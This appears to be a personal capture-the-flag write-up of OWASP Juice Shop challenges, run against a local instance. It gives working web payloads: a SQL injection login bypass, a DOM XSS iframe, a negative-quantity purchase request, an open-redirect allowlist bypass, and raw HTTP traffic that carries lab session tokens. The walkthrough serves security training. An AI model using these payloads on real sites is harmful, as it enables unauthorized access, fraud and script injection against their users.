# OWASP Juice Shop

## Find hidden score board

Based on the info I received at the beginning I know the first challenge was to find the "score-board" and challenge page. I decided to start looking through the Javascript starting with main.js because that seemed the most likely to find such info. Beautifying and looking through the code I see the following:


```

                }, {
                    path: "hacking-instructor",
                    component: yt
                }, {
                    path: "score-board",
                    component: Cr
                }, {
                    path: "track-result",
                    component: Kt
                }, {

```

Based on this I go to the home page and just append `score-board` at the end and I find the correcvt page.


## Login Admin

This was a simple SQLi and all I had to do here was use the payload:

`admin' or '1'='1'--`

in the username part of the form and I was able to login as admin

## Bully chatbot

This was an odd vulnerability in that if you first ask the chatbot for a coupon once it will say no but if you
do it multiple times it will eventually issue one.

## Error handling

While I was messing around with the functionality that allows you to add products to baskets I provoked an error that wasn't handled 'gracefully' or 'consistently'. This was because I attempted to use a `+1` in a json payload which was unexpected in the parser. The request and response is below.


```
PUT /api/BasketItems/1 HTTP/1.1
Host: localhost:3000
Content-Length: 15
sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108"
Accept: application/json, text/plain, */*
Content-Type: application/json
sec-ch-ua-mobile: ?0
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJjb3Vwb24iLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDEtMTJUMDc6NTA6MjEuMDY3WiIsInVwZGF0ZWRBdCI6IjIwMjMtMDEtMTJUMDg6MDg6MDMuMTg4WiIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY3MzUxMDg4MywiZXhwIjoxNjczNTI4ODgzfQ.dVLz0KhlFBEZk_kWcwN0DMUIi9zwoX6VS8mndI_P-20NlktywEWxMATukCyY4F3KND02pqTDWbrBVcOYIxUUGrikL2N61GbZjWpIft5LAOcrMpbBPIXkfy11nGD0wURiUoifC0ydtWwDyRQHQaOFtiTuDj4TueHfyDf2GDm1VCI
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
sec-ch-ua-platform: "Linux"
Origin: http://localhost:3000
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJjb3Vwb24iLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDEtMTJUMDc6NTA6MjEuMDY3WiIsInVwZGF0ZWRBdCI6IjIwMjMtMDEtMTJUMDg6MDg6MDMuMTg4WiIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY3MzUxMDg4MywiZXhwIjoxNjczNTI4ODgzfQ.dVLz0KhlFBEZk_kWcwN0DMUIi9zwoX6VS8mndI_P-20NlktywEWxMATukCyY4F3KND02pqTDWbrBVcOYIxUUGrikL2N61GbZjWpIft5LAOcrMpbBPIXkfy11nGD0wURiUoifC0ydtWwDyRQHQaOFtiTuDj4TueHfyDf2GDm1VCI; continueCode=X8mvLEnjWg1KVNQ5BwRlXpemrAqQiowSPMAkzD7aP236qZo4bJY8xMyO9xgr
Connection: close

{"quantity":+1}

```

```
HTTP/1.1 500 Internal Server Error
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Vary: Accept-Encoding
Date: Thu, 12 Jan 2023 08:24:38 GMT
Connection: close
Content-Length: 1411



{
  "error": {
    "message": "Unexpected token + in JSON at position 12",
    "stack": "SyntaxError: Unexpected token + in JSON at position 12\n    at JSON.parse (<anonymous>)\n    at jsonParser (/home/kali/ctf/juice-shop_14.4.0/build/server.js:265:33)\n    at Layer.handle [as handle_request] (/home/kali/ctf/juice-shop_14.4.0/node_modules/express/lib/router/layer.js:95:5)\n    at trim_prefix (/home/kali/ctf/juice-shop_14.4.0/node_modules/express/lib/router/index.js:328:13)\n    at /home/kali/ctf/juice-shop_14.4.0/node_modules/express/lib/router/index.js:286:9\n    at Function.process_params (/home/kali/ctf/juice-shop_14.4.0/node_modules/express/lib/router/index.js:346:12)\n    at next (/home/kali/ctf/juice-shop_14.4.0/node_modules/express/lib/router/index.js:280:10)\n    at /home/kali/ctf/juice-shop_14.4.0/node_modules/body-parser/lib/read.js:137:5\n    at AsyncResource.runInAsyncScope (node:async_hooks:204:9)\n    at invokeCallback (/home/kali/ctf/juice-shop_14.4.0/node_modules/raw-body/index.js:231:16)\n    at done (/home/kali/ctf/juice-shop_14.4.0/node_modules/raw-body/index.js:220:7)\n    at IncomingMessage.onEnd (/home/kali/ctf/juice-shop_14.4.0/node_modules/raw-body/index.js:280:7)\n    at IncomingMessage.emit (node:events:513:28)\n    at endReadableNT (node:internal/streams/readable:1359:12)\n    at process.processTicksAndRejections (node:internal/process/task_queues:82:21)"
  }
}

```


## Payback Time 

This vulnerability is common among CTFs that have "payments/products/baskets" and the vulnerability is that can you input a negative quantity of a certain product and it gets processed through the purchase order with the worst case allowing the user to steal funds from the company. Below are the request and responses:


```

POST /api/BasketItems/ HTTP/1.1
Host: localhost:3000
Content-Length: 43
sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108"
Accept: application/json, text/plain, */*
Content-Type: application/json
sec-ch-ua-mobile: ?0
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJjb3Vwb24iLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDEtMTJUMDc6NTA6MjEuMDY3WiIsInVwZGF0ZWRBdCI6IjIwMjMtMDEtMTJUMDg6MDg6MDMuMTg4WiIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY3MzUxMDg4MywiZXhwIjoxNjczNTI4ODgzfQ.dVLz0KhlFBEZk_kWcwN0DMUIi9zwoX6VS8mndI_P-20NlktywEWxMATukCyY4F3KND02pqTDWbrBVcOYIxUUGrikL2N61GbZjWpIft5LAOcrMpbBPIXkfy11nGD0wURiUoifC0ydtWwDyRQHQaOFtiTuDj4TueHfyDf2GDm1VCI
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
sec-ch-ua-platform: "Linux"
Origin: http://localhost:3000
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJjb3Vwb24iLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDEtMTJUMDc6NTA6MjEuMDY3WiIsInVwZGF0ZWRBdCI6IjIwMjMtMDEtMTJUMDg6MDg6MDMuMTg4WiIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY3MzUxMDg4MywiZXhwIjoxNjczNTI4ODgzfQ.dVLz0KhlFBEZk_kWcwN0DMUIi9zwoX6VS8mndI_P-20NlktywEWxMATukCyY4F3KND02pqTDWbrBVcOYIxUUGrikL2N61GbZjWpIft5LAOcrMpbBPIXkfy11nGD0wURiUoifC0ydtWwDyRQHQaOFtiTuDj4TueHfyDf2GDm1VCI; continueCode=naYvZLPrBgEDx4Mb15pl2kOdRjT9iK6S29uayd3yNe86zJ79wqmRjWnXVKQo
Connection: close


{"ProductId":6,"BasketId":"2","quantity":-10}


```


```

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 559
ETag: W/"22f-LpwVvKynpkWzHp8yYnsCIdKbEYI"
Vary: Accept-Encoding
Date: Thu, 12 Jan 2023 08:48:04 GMT
Connection: close


{"status":"success","data":{"id":2,"coupon":null,"UserId":2,"createdAt":"2023-01-12T07:50:22.072Z","updatedAt":"2023-01-12T07:50:22.072Z","Products":[{"id":4,"name":"Raspberry Juice (1000ml)","description":"Made from blended Raspberry Pi, water and sugar.","price":4.99,"deluxePrice":4.99,"image":"raspberry_juice.jpg","createdAt":"2023-01-12T07:50:21.869Z","updatedAt":"2023-01-12T07:50:21.869Z","deletedAt":null,"BasketItem":{"ProductId":6,"BasketId":2,"id":6,"quantity":-10,"createdAt":"2023-01-12T07:50:22.115Z","updatedAt":"2023-01-12T08:47:09.436Z"}}]}}

```

And the confirmation response below:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 45
ETag: W/"2d-hpitweAY8qpWauhdsw8QxZcoAj0"
Vary: Accept-Encoding
Date: Thu, 12 Jan 2023 08:50:09 GMT

Connection: close

{"orderConfirmation":"5267-2216c1af325f3ce3"}

```

## DOM XSS

The dom XSS is located in the search bar and we can use the payload `<iframe src="javascript:alert(`xss`)">` to pop it.


## Confidential Document

In this challenge I had to locate a confidental document that the company had left some sort of access to. I first looked over the main.js (seen in the score-board challenge) to see if any of the url paths seemed interesting, I did see asset and upload paths however none of them I had access to when just typing in the url. I then decided to continue having a generic look around the site including the `about us` page where there was a link that lead to `http://localhost:3000/ftp/legal.md`. I figured while legal.md probably isn't the confidential document I may be able to gain access to the ftp folder and sure enough I was. The url that had the confidential document turned out to be `http://localhost:3000/ftp/acquisitions.md`.


## Admin Section 

The adminsitration section of the store is located at `http://localhost:3000/#/administration`.


## Allowlist Bypass (Open redirect)

In this vulnerability there was a open redirect in the `to` parameter which by default is generally populated by the juice-shop github. There is also some whitelisting going on so you can't just remove the github url, however after some playing around I discovered that the following url fufills the whitelist while redirecting to a different domain.


`http://localhost:3000/redirect?to=https://www.google.com/https://github.com/bkimminich/juice-shop`

